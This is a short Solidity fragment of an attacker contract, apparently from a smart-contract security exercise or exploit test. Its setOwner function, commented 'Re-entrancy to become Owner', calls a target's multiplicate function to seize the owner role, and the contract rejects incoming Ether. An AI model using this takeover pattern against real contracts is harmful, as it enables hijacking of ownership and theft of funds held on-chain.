    C target;
    function setOwner() external {
        // Re-entrancy to become Owner
        address(target).call(abi.encodeWithSignature("multiplicate(address)", address(this)));
    }
    receive() external payable {
        revert("ADR: reject Ether");
    }
    fallback() external payable {
        revert("ADR: fallback reject");
    }
